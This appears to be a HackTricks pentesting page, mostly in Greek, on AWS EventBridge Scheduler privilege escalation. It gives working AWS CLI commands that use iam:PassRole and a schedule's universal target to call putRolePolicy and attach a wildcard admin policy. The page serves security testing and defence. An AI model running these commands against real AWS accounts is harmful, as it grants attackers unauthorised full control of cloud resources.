# AWS - EventBridge Scheduler Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## EventBridge Scheduler

Περισσότερες πληροφορίες για το EventBridge Scheduler στο:

{{#ref}}
../../aws-services/eventbridgescheduler-enum.md
{{#endref}}

### `iam:PassRole`, (`scheduler:CreateSchedule` | `scheduler:UpdateSchedule`)

Ένας attacker με αυτά τα permissions θα μπορεί να **`create`|`update` έναν scheduler και να καταχραστεί τα permissions του scheduler role** που επισυνάπτεται σε αυτόν για να εκτελέσει οποιαδήποτε ενέργεια

Για παράδειγμα, θα μπορούσαν να ρυθμίσουν το schedule ώστε να **invoke a Lambda function** το οποίο είναι μια templated action:
```bash
aws scheduler create-schedule \
--name MyLambdaSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:lambda:<region>:<account-id>:function:<LambdaFunctionName>",
"RoleArn": "arn:aws:iam::<account-id>:role/<RoleName>"
}'
```
Εκτός από τις προτυποποιημένες ενέργειες υπηρεσίας, μπορείτε να χρησιμοποιήσετε τα **universal targets** στο EventBridge Scheduler για να καλέσετε ένα ευρύ φάσμα λειτουργιών API για πολλές υπηρεσίες AWS. Τα universal targets προσφέρουν ευελιξία για να καλείτε σχεδόν οποιοδήποτε API. Ένα παράδειγμα είναι η χρήση universal targets για την προσθήκη της πολιτικής **AdminAccessPolicy**, χρησιμοποιώντας έναν ρόλο που έχει την πολιτική **putRolePolicy**:
```bash
aws scheduler create-schedule \
--name GrantAdminToTargetRoleSchedule \
--schedule-expression "rate(5 minutes)" \
--flexible-time-window "Mode=OFF" \
--target '{
"Arn": "arn:aws:scheduler:::aws-sdk:iam:putRolePolicy",
"RoleArn": "arn:aws:iam::<account-id>:role/RoleWithPutPolicy",
"Input": "{\"RoleName\": \"TargetRole\", \"PolicyName\": \"AdminAccessPolicy\", \"PolicyDocument\": \"{\\\"Version\\\": \\\"2012-10-17\\\", \\\"Statement\\\": [{\\\"Effect\\\": \\\"Allow\\\", \\\"Action\\\": \\\"*\\\", \\\"Resource\\\": \\\"*\\\"}]}\"}"
}'
```
## Αναφορές

- [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-templated.html)
- [https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html](https://docs.aws.amazon.com/scheduler/latest/UserGuide/managing-targets-universal.html)

{{#include ../../../../banners/hacktricks-training.md}}
